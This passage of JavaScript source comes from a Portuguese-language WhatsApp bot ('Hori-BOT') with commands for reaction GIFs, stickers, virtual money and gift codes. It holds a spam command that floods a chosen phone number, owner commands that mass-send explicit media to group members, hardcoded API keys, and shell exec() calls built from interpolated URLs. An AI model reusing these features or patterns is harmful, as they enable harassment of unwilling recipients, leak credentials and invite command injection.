if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer fazer sexo')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `O @${sender.split("@")[0]} esta numa fudelancia com @${mentioned[0].split('@')[0]} ${randomemojis}` 
const fuder = fs.readFileSync('./src/fuder.mp4')
loli.sendMessage(from, fuder,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'bazuka':
case 'bazukar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá uma bazukada')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} Acabo de da uma bazukada na(o) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const bazuka2 = fs.readFileSync('./src/bazukagg.mp4')
loli.sendMessage(from, bazuka2,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'beijo':
case 'beijar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer da um beijo')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Que fofo... @${sender.split("@")[0]} deu um beijo no(a) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const beijo = fs.readFileSync('./src/beijo.mp4')
loli.sendMessage(from, beijo,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'abraço':
case 'abraco':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá um abraço')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} deu um abraço no(a) @${mentioned[0].split('@')[0]} 🔥` 
const tobiz = fs.readFileSync('./src/abraço.mp4')
loli.sendMessage(from, tobiz,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'dedada':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá o dedada')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} Acabo de da uma dedada na(o) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const dedada = fs.readFileSync('./src/dedada.mp4')
loli.sendMessage(from, dedada,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'bicuda':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer dá uma bicuda')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} Acabo de dar uma bicuda Braba na(o) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const bicuda = fs.readFileSync('./src/bicuda.mp4')
loli.sendMessage(from, bicuda,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'cafune':
case 'cafuné':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você fazer um cafuné')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `ow q fofo... @${sender.split("@")[0]} Acabou de fazer um cafuné nele(a) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const cafuné = fs.readFileSync('./src/cafuné.mp4')
loli.sendMessage(from, cafuné,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break
case 'mata':
case 'matar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer matar')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = ` @${sender.split("@")[0]} Acabou de Matar a Sangue Frio @${mentioned[0].split('@')[0]} ${randomemojis}` 
const mata = fs.readFileSync('./src/mata.mp4')
loli.sendMessage(from, mata,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'assalto':
case 'assaltar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer assaltar')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = ` @${sender.split("@")[0]} Acabou de Assaltar um OTARIO @${mentioned[0].split('@')[0]} ${randomemojis}` 
const assalto = fs.readFileSync('./src/assalto.mp4')
loli.sendMessage(from, assalto,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'desvia':
case 'desviar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer desviar')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = ` @${sender.split("@")[0]} Acabou de Desviar de Todos Os Ataques de @${mentioned[0].split('@')[0]} ${randomemojis}` 
const desviar = fs.readFileSync('./src/desvia.mp4')
loli.sendMessage(from, desviar,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'casar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer casar')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = ` Felizes Para Sempre @${sender.split("@")[0]} Acabou de casar com  @${mentioned[0].split('@')[0]} ${randomemojis}` 
const casar = fs.readFileSync('./src/casar.mp4')
loli.sendMessage(from, casar,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'soco':
case 'socão':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você fazer um soco')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} Deu um soco na cara do(a) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const soco = fs.readFileSync('./src/soco.mp4')
loli.sendMessage(from, soco,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'sentada':
case 'sentar':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('marque o alvo que você quer da uma sentada')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `@${sender.split("@")[0]} Deu uma sentada no(a) @${mentioned[0].split('@')[0]} ${randomemojis}` 
const sentada = fs.readFileSync('./src/sentada.mp4')
loli.sendMessage(from, sentada,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: susp})
break

case 'carga':	//愛	
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
teks = baterai
url = `http://brizas-api.herokuapp.com/ttp/attp2?apikey=BOT SOPHIA&text=Nivel da bateria: ${encodeURI(teks)}`
reply (ptbr.wait())
send = await getBuffer(url)
loli.sendMessage(from, send, sticker, {quoted: mek})
break	

/*.catch(async (e) => {
                console.error(e)
                await reply(`Error!\n${e}`)
                })
Em baixo do sendmessages*/

/*if (body == `/${command}`) {
reply('[📌]espere...')
loli = await getBuffer(`https://fdz-app.herokuapp.com/api/pinterest?q=${command}`, {method: 'get'})
loli.sendMessage(from, loli, image, {quoted: say1, thumbnail:null})
}

if (body == `${prefix}${command}`) {
hsl = `
        ────────────────
Oi @${sender.split("@")[0]}!!
O comando: ${prefix}${command} não existe

Tem certeza que digitou corretamente?🧙‍♂️
Use ${prefix}Menu para listar meus comandos
        ────────────────`
loli.sendMessage(from, hsl, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
}

*/

case 'bcfig':    //Tobi gay
case 'bcsticker':
case 'bcstik':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return 
anu = await loli.chats.all()
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await loli.downloadMediaMessage(encmedia)
for (let _ of anu) {
loli.sendMessage(_.jid, bc, sticker, {quoted:say2})
}
reply('Pronto🐤')
}
break

case 'bcimg':
if (!isOwner) return 
anu = await loli.chats.all()
if (isMedia && !mek.message.imageMessage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
bc = await loli.downloadMediaMessage(encmedia)
for (let _ of anu) {
loli.sendMessage(_.jid, bc, image, {sendEphemeral: true})
}
reply('Pronto🐤')
}
break

case 'boc2':
if (!isOwner) return reply(ptbr.ownerB())
anu = await loli.chats.all()
const bodiaMp4 = fs.readFileSync('./assets/bomdia.mp4')
for (let _ of groupMembers) {
loli.sendMessage(_.jid, bodiaMp4, MessageType.video, {mimetype: 'video/mp4', ptt: true})
}
break

case 'boc':
if (!isOwner) return reply(ptbr.ownerB())
const aMimirMp3 = fs.readFileSync('./assets/hentai234.mp3')
const aMimirSt = fs.readFileSync('./assets/hentai234.webp')
for (let _ of groupMembers) {
loli.sendMessage(_.jid, aMimirMp3, MessageType.audio, {mimetype: 'audio/mp4', ptt:true})
loli.sendMessage(_.jid, aMimirSt, sticker)
}
break

case 'q1': 	
if (args.length < 1) return reply(`Use assim:  exemplo : ${prefix}spam 556181496039 corno`)
if (args[0].startsWith('08')) return reply('coloque o número do país exemplo : 55')
mansed = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
const kontul = body.slice(8)
if (kontul.length > 300) return loli.sendMessage(from, 'Desculpe, o texto é muito longo, máximo de 300 textos', text, {quoted: mek})
var nomor = mek.participant
const busah = `*[  ⚠️SPAM⚠️  ]*\nNúmero : @${nomor.split('@s.whatsapp.net')[0]}\nSpam: ${kontul}`
var options = {
text: busah,
contextInfo: {mentionedJid: [nomor]},
}
//loli.sendMessage(`${mansed}`, options, text, {quoted: mek})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
break

case 'hinata':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
loli.updatePresence(from, Presence.composing)
am = ["Hinata Hyuga"]
nk = am[Math.floor(Math.random() * am.length)]
data = await fetchJson(`https://fdz-app.herokuapp.com/api/pinterest?q=${nk}`, {
method: 'get'
})
reply(mess.only.tobianime)
n = JSON.parse(JSON.stringify(data));
nimek = n[Math.floor(Math.random() * n.length)];
pok = await getBuffer(nimek)
loli.sendMessage(from, pok, image, {
})
break

//https://fdz-app.herokuapp.com/api/pinterest?q=coxinha

/*case 'spam': 	
if (args.length < 1) return reply(`Use assim:  exemplo : ${prefix}spam 556181496039 corno`)
if (args[0].startsWith('08')) return reply('coloque o número do país exemplo : 55')
//if (args[0].startsWith(`${ownerNumberB}`)) return reply(`Eu não posso enviar spam para meu criador ${namaowner} 😞`)
mansed = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
const kontul = body.slice(8)
if (kontul.length > 300) return loli.sendMessage(from, 'Desculpe, o texto é muito longo, máximo de 300 textos', text, {quoted: mek})
var nomor = mek.participant
const busah = `*[  ⚠️SPAM⚠️  ]*\nNúmero : @${nomor.split('@s.whatsapp.net')[0]}\nSpam: ${kontul}`
var options = {
text: busah,
contextInfo: {mentionedJid: [nomor]},
}
loli.sendMessage(`${mansed}`, options, text, {quoted: mek})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
.then(() => { loli.sendMessage(`${mansed}`, options, text, {quoted: mek})})
reply('Spam enviado com sucesso')
break*/

/*case 'level': //Jogos
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isGroup) return reply(ptbr.group())
if (!isLevelingOn) return reply(ptbr.levelnoton()) // OBS: SERVE PARA N DEIXAR PUXA ESSE COMANDO
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
const userTime = getRegisterTime(sender) 
if (userLevel === undefined && userXp === undefined) return reply(ptbr.levelnol())
const requiredXp = 20 * Math.pow(userLevel, 2) + 150 * userLevel + 1000
/*levela =
`  ╾╾╾╾❖ LEVEL ❖╾╾╾╾

╭╼╾╼╾╼╾╼╾╼╾╼╾╼
║‣ Nome: @${sender.split("@")[0]}
├╼╾╼╾╼╾╼╾╼╾╼╾╼
║‣ XP: ${userXp}/${requiredXp}
├╼╾╼╾╼╾╼╾╼╾╼╾╼
║‣ Level: ${userLevel}
├╼╾╼╾╼╾╼╾╼╾╼╾╼
║‣ Patente: ${patt}
╚╼╾╼╾╼╾╼╾╼╾╼╾╼

  ╾╾╾╾❖ LEVEL ❖╾╾╾╾`     
loli.sendMessage(from, levela, text, {quoted: mek, contextInfo: {mentionedJid: [sender]}})
//loli.sendMessage(from, leveltab(pushname, userLevel, userXp, patt), text, {
quoted: mek,
contextInfo: {
mentionedJid: [sender]
}
})
.catch(async(err) => {
console.error(err)
await reply(`Error!\n${err}`)
})
break

═══════ ♢.✰.♢ ═══════
    ${selectMoon1}「 Ｌｅｖｅｌ」${selectMoon2}
❖ NOME: @${sender.split("@")[0]}
╭━════════════════━
│╭━══════════════━
││➣ ${waktoonyabro}
││➣ LEVEL: ${userLevel} 💠
││➣ XP: ${userXp}🔮
││        └ ${selectbar} ${porcent}%
││➣ PATENTE: ${patt} 
│╰━══════════════━
└━════════════════━
*/

case 'dinhero':          
case 'dinheiro':
case 'money':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const dinheirogif1 = fs.readFileSync('./src/dinheirogif.mp4')
const uangkau = checkATMuser(sender)
loli.sendMessage(from, dinheirogif1,  MessageType.video, {mimetype: 'video/gif', quoted: mek, caption: `
┬────────────┈ ⳹
┌┤➤ 🤑DINHEIRO🤑
││
││𝙽𝚘𝚖𝚎 : ${pushname}
││𝙽𝚞𝚖𝚎𝚛𝚘 : ${sender.split("@")[0]}
││𝙳𝚒𝚗𝚑𝚎𝚒𝚛𝚘 : ${uangkau}
│├────────
││_𝚂𝚒𝚜𝚝𝚎𝚖𝚊 𝚖𝚘𝚗𝚎𝚢_
│└────────
│Copyright © zadik/Hori-BOT 2022
╰─━━━─── • ───━━━❋ཻུ۪۪⸙`})
break

case 'giftcard':			
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (m.isGroup) return reply(`Você so pode resgatar no privado do bot mas tem ganhar uma partida de torneio`)
if (args.length == 0) return reply(`Cadê o código?!`,)
if (args[0] == '679381henplay' || args[0] == '5262626henplay' || args[0] == 'horibotgifthenplay' || args[0] == 'zadikgift74819' || args[0] == 'henplaygift7989') {

reply('*Codigo resgatado!!*\n\nVocê ganhou:\n50000 dinheiro!')
addKoinUser(sender, 50000)
} else {
reply(`*CÓDIGO INVALIDO!*\n\nFale com meu criador para ele te dar um codigo ilimitado`)
}
break
// novos imgbb

case 'preso':
case 'figupreso':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await loli.downloadAndSaveMediaMessage(ger)
preso = await imgbb("941644256336912a1409c0bcfce50071", owgi)
imgtrg = `${preso.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
preso1 = `https://api-exteam.herokuapp.com/api/jail?img=${imgtrg}`
exec(`wget ${preso1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(ranp)
if (err) return reply(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
loli.sendMessage(from, nobg, sticker, {quoted: say1})
fs.unlinkSync(rano)
})
})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'figuinvert':
case 'invert':
case 'figuinvertida':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await loli.downloadAndSaveMediaMessage(ger)
figuinvertida = await imgbb("941644256336912a1409c0bcfce50071", owgi)
imgtrg = `${figuinvertida.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
figuinvertida1 = `https://api-exteam.herokuapp.com/api/invert?img=${imgtrg}`
exec(`wget ${figuinvertida1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(ranp)
if (err) return reply(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
loli.sendMessage(from, nobg, sticker, {quoted: say1})
fs.unlinkSync(rano)
})
})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'figuprocurado':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await loli.downloadAndSaveMediaMessage(ger)
anu = await imgbb("941644256336912a1409c0bcfce50071", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-exteam.herokuapp.com/api/procurado?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(ranp)
if (err) return reply(`DEU ERROR 😔😔`)
nobg = fs.readFileSync(rano)
loli.sendMessage(from, nobg, sticker, {quoted: say1})
fs.unlinkSync(rano)
})
})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'figuwasted':      
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await loli.downloadAndSaveMediaMessage(ger)
figuwasted = await imgbb("941644256336912a1409c0bcfce50071", owgi)
imgtrg = `${figuwasted.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
figuwasted1 = `https://api-exteam.herokuapp.com/api/wasted?img=${imgtrg}`
exec(`wget ${figuwasted1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(ranp)
if (err) return reply(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
loli.sendMessage(from, nobg, sticker, {quoted: say1})
fs.unlinkSync(rano)
})
})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'arma':
case 'figuarma':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await loli.downloadAndSaveMediaMessage(ger)
figuarma = await imgbb("941644256336912a1409c0bcfce50071", owgi)
imgtrg = `${figuarma.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
figuarma1 = `https://api-exteam.herokuapp.com/api/gun?img=${imgtrg}`
exec(`wget ${figuarma1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(ranp)
if (err) return reply(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
loli.sendMessage(from, nobg, sticker, {quoted: say1})
fs.unlinkSync(rano)
})
})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'borra':
case 'figuborrada':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await loli.downloadAndSaveMediaMessage(ger)
anu = await imgbb("941644256336912a1409c0bcfce50071", owgi)
imgtrg = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/pixelate?img=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(ranp)
if (err) return reply(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
loli.sendMessage(from, nobg, sticker, {quoted: say1})
fs.unlinkSync(rano)
})
})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')
}
break
case '1977':
case 'aden':
case 'brannan':
case 'brooklyn':
case 'clarendon':
case 'gingham':
case 'hudson':
case 'inkwell':
case 'earlybird':
case 'kelvin':
case 'lark':
case 'lofi':
case 'maven':
case 'mayfair':
case 'moon':
case 'nashville':
case 'perpetua':
case 'reyes':
case 'rise':
case 'slumber':
case 'stinson':
case 'toaster':
case 'valencia':
case 'walden':
case 'willow':
case 'xpro2':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
reply(mess.wait)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
damppa = await loli.downloadAndSaveMediaMessage(ted)
dpaa = await imgbb('941644256336912a1409c0bcfce50071', damppa)
uhyy = await getBuffer(`https://api.lolhuman.xyz/api/filter/${command}?apikey=ChOkYbOT8&img=${dpaa.display_url}`)
loli.sendMessage(from, uhyy, image, {quoted: say1})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'figupet':     
 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await loli.downloadAndSaveMediaMessage(ger)
figupet = await imgbb("941644256336912a1409c0bcfce50071", owgi)
imgtrg = `${figupet.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api-gdr2.herokuapp.com/api/petpet?url=${imgtrg}`
exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(ranp)
if (err) return reply(`DEU ERROR 😞`)
nobg = fs.readFileSync(rano)
loli.sendMessage(from, nobg, sticker, {quoted: say1})
fs.unlinkSync(rano)
})
})
} else {
reply('Você precisa marcar ou enviar uma imagem para isso')
}
break

case 'drip':
case 'figudrip':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                        reply(mess.wait)                     
                        owgi = await loli.downloadAndSaveMediaMessage(ger)
                        anu = await imgbb("941644256336912a1409c0bcfce50071", owgi)
                        imgtrg = `${anu.display_url}`
                        ranp = getRandom('.gif')
                        rano = getRandom('.webp')
                        anu1 = `https://api-exteam.herokuapp.com/api/dripp?img=${imgtrg}`
                        exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        exec(`webpmux -set exif ${addMetadata('Hori-BOT', 'Henplay')} ${rano} -o ${rano}`, async (error) => {
                            fs.unlinkSync(ranp)
                            if (err) return reply(`DEU ERROR 😞`)
                            nobg = fs.readFileSync(rano)
